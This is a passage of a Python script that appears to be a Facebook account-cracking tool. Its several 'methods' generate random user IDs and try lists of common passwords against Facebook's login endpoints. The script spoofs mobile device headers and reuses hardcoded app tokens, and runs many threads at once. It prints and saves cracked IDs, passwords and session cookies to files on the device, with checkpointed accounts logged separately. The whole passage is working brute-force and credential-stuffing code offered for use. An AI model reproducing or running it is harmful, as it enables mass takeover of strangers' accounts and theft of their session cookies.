                        headers = {'Authorization':f'OAuth {accessToken}',"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),'X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent': ____U_A_2____(),'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                open('/sdcard/GEN-M3-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M3-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M4 >>-------------#
def ____M_E_T_H_O_D_D____(ids,passlist,tl):
        global loop,oks,cps
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ____U_A_1____(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                open('/sdcard/GEN-M4-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M4-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M5 >>-------------#
def ____M_E_T_H_O_D_E____(ids,passlist,tl):
	global loop,oks,cps
	xp=f"{bx}[{gx}MR{bx}]{gx}"
	sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
	ewe = requests.Session()
	ua = generate_wv_ua()
	
	# Single GET request to get tokens once
	try:
		link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
		# Extract tokens once
		m_ts = re.search(r'name="m_ts" value="(.*?)"', str(link)).group(1)
		li_val = re.search(r'name="li" value="(.*?)"', str(link)).group(1)
		jazoest = re.search(r'name="jazoest" value="(\d+)"', str(link)).group(1)
		lsd_val = re.search(r'name="lsd" value="(.*?)"', str(link)).group(1)
	except:
		return
	
	# Now loop through passwords using the same tokens
	for pas in passlist:
		try:
			data = {"m_ts": m_ts,"li": li_val,"try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": jazoest,"lsd": lsd_val}
			headers = {"Host": "touch.facebook.com","content-length": str(len((data))),"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)', str(ua)).group(1),re.search(r'Chrome/(\d+)', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": lsd_val,"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = data,headers = headers,allow_redirects = False)
			if "checkpoint" in ewe.cookies.get_dict():
				uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				if 'y' in pcp:
				    year = tutulx(str(uid))
				    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
				    os.system('espeak -a 300 "Cp"')
				open('/sdcard/GEN-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				uid = re.findall('c_user=(.*);xs', kuki)[0]
				year = tutulx(str(uid))
				print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
				os.system('espeak -a 300 "GEN,  Ok,  id"')
				print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+kuki);print('')
				open('/sdcard/GEN-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+kuki+'\n')
				oks.append(str(uid))
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
	
#------------->> RANDOM METHOD M6 >>-------------#
def ____M_E_T_H_O_D_F____(ids,passlist,tl):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    for pas in passlist:
        # Use Nigerian user agent
        ua = generate_wv_ua()
        
        datax = {
            'adid': str(uuid.uuid4()), 
            'format': 'json', 
            'device_id': str(uuid.uuid4()), 
            'email': ids, 
            'password': pas, 
            'generate_analytics_claims': '1', 
            'community_id': '', 
            'cpl': 'true', 
            'try_num': '1', 
            'family_device_id': str(uuid.uuid4()), 
            'credentials_type': 'password', 
            'source': 'login', 
            'error_detail_type': 'button_with_disabled', 
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        header = {
            'User-Agent': ua, 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 50000000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': random.choice(['WIFI', 'CELLULAR', 'MOBILE.4G']), 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True'
        }
        
        try:
            lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False, timeout=30).json()
            
            if 'session_key' in lo:
                cki = lo['session_cookies']
                ck = {}
                for xk in cki:
                    ck.update({xk['name']: xk['value']})
                coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
                uid = lo['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-M6-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in lo['error']['message']:
                uid = lo['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-M6-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                cps.append(str(uid))
                break
            else:
                continue
                
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.Timeout:
            continue
        except json.JSONDecodeError:
            continue
        except Exception as e:
            continue
            
    loop +=1

#------------->> OLD MAIN MENU >>-------------#
def ____O_L_D____():
	clear();print(f'{xd} EXAMPLE {bx}:{gx} 5555 {bx}|{gx} 7777 {bx}|{gx} 9999 {bx}|{gx} 99999 ');linex();limit = int(input(f'{xdx} SELECTION {bx}:{wx} '))
	___B_A_L___ = "10000"
	for ixx in range(int(limit)):khalifa = str(random.choice(range(1000000000,1999999999)));user.append(khalifa)
	with tred(max_workers=40) as ____D_O_N____:
		clear();tl=str(len(user))
		print(f'{xd} TOTAL LIMIT {bx}:{wx} {tl} ');print (f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ');linex()
		for lover in user:
			ids = ___B_A_L___ + lover
			passlist = ["123456","1234567","12345678","123456789","123123","143143","1234567890","112233"]
			____D_O_N____.submit(___M_T_D_X___,ids,passlist)
	linex();print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK UID {bx}:{gx} ' + str(len(oks)));print(f"\n{wx}{47*'-'}");exit()

#------------->> OLD METHOD M1 >>-------------#
def ___M_T_D_X___(ids,passlist):
    global loop,oks
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    #_____mrpoco_____ = random.choice(ugen)
    try:
        for pas in passlist:
            data = {'adid':str(uuid.uuid4()),'email':ids,'password':pas,'cpl':'true','credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',"family_device_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"locale":"en_US","client_country_code":"US","device_id": str(uuid.uuid4()),"method": "auth.login","api_key": "882a8490361da98702bf97a021ddc14d","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {'content-type':'application/x-www-form-urlencoded','Host': 'graph.facebook.com','x-fb-sim-hni':str(random.randint(20000,40000)),'X-FB-Connection-Type': 'WIFI','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent':____U_A_3____(),'x-fb-net-hni':str(random.randint(20000,40000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','accept-encoding':'gzip, deflate','x-fb-http-engine':'Liger'};url = "https://graph.facebook.com/auth/login"
            response = requests.post(url,data=data,headers=head,verify=True).json()
            if "access_token" in response:
                uid = response['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-OLD-OK-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                oks.append(str(uid))
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                uid = response['error']['error_data']['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-OLD-OK-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                oks.append(str(uid))
                break
            else:continue
        loop += 1
    except Exception as e:pass

#------------->> END SCRIPT >>-------------#
# Start the key authentication
On()